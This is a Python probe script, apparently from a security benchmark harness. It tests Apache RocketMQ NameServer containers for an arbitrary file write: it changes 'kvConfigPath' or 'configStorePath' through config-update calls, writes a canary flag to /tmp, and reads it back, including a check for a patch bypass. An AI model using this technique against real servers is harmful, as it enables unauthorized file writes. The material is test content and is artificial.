#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the official NameServer.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import time

from rocketmq_remoting import put_kv_config, update_namesrv_config

MARKER_PATH = "/tmp/pcb_marker.txt"
HOST = "127.0.0.1"


def _container_flag(version: str) -> str:
    project = os.environ.get("COMPOSE_PROJECT_NAME") or ""
    case_dir = os.environ.get("CASE_DIR") or ""
    svc = f"namesrv-{version}"
    cmd = [
        "docker", "compose", "-p", project,
        "--project-directory", case_dir,
        "--profile", version,
        "exec", "-T", svc, "printenv", "PCB_FLAG",
    ]
    r = subprocess.run(cmd, capture_output=True, text=True, check=False, timeout=15)
    return (r.stdout or "").strip()


def _flag(version: str) -> str:
    # Write the start-injected token (RUN_FLAG_REF / container PCB_FLAG).
    # Never use verify-time RUN_FLAG: wrong/stale overrides would self-match.
    ref = (os.environ.get("RUN_FLAG_REF") or "").strip()
    if ref:
        return ref
    cflag = _container_flag(version)
    if cflag:
        return cflag
    return "PCBFLAG_UNSET"


def _port(version: str) -> int:
    raw = os.environ.get("PCB_TARGET_PORT") or ""
    if raw.isdigit():
        return int(raw)
    return {"v0": 39870, "v1": 39871, "v2": 39872}.get(version, 39871)


def _read_marker(version: str) -> str:
    project = os.environ.get("COMPOSE_PROJECT_NAME") or ""
    case_dir = os.environ.get("CASE_DIR") or ""
    svc = f"namesrv-{version}"
    cmd = [
        "docker", "compose", "-p", project,
        "--project-directory", case_dir,
        "--profile", version,
        "exec", "-T", svc, "cat", MARKER_PATH,
    ]
    r = subprocess.run(cmd, capture_output=True, text=True, check=False, timeout=15)
    return r.stdout or ""


def _send_original(version: str, flag: str) -> dict:
    port = _port(version)
    resp1 = update_namesrv_config(HOST, port, {"kvConfigPath": MARKER_PATH})
    if resp1.get("code", -1) != 0:
        return {
            "version": version,
            "property": "kvConfigPath",
            "update_code": resp1.get("code"),
            "remark": resp1.get("remark", ""),
            "body": "",
            "blocked": True,
        }
    time.sleep(0.5)
    resp2 = put_kv_config(HOST, port, "PCB_CANARY", "flag", flag)
    time.sleep(1)
    content = _read_marker(version)
    return {
        "version": version,
        "property": "kvConfigPath",
        "update_code": resp1.get("code"),
        "kv_code": resp2.get("code"),
        "body": content,
        "blocked": False,
    }


def _send_residual(version: str, flag: str) -> dict:
    port = _port(version)
    resp = update_namesrv_config(HOST, port, {
        "configStorePath": MARKER_PATH,
        "productEnvName": flag,
    })
    if resp.get("code", -1) != 0:
        return {
            "version": version,
            "property": "configStorePath",
            "update_code": resp.get("code"),
            "remark": resp.get("remark", ""),
            "body": "",
            "blocked": True,
        }
    time.sleep(1)
    content = _read_marker(version)
    return {
        "version": version,
        "property": "configStorePath",
        "update_code": resp.get("code"),
        "body": content,
        "blocked": False,
    }


def run_probe(candidate_desc, *, version="v1"):
    prop = candidate_desc.get("property", "kvConfigPath")
    flag = _flag(version)
    if prop == "kvConfigPath":
        return _send_original(version, flag)
    return _send_residual(version, flag)


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))
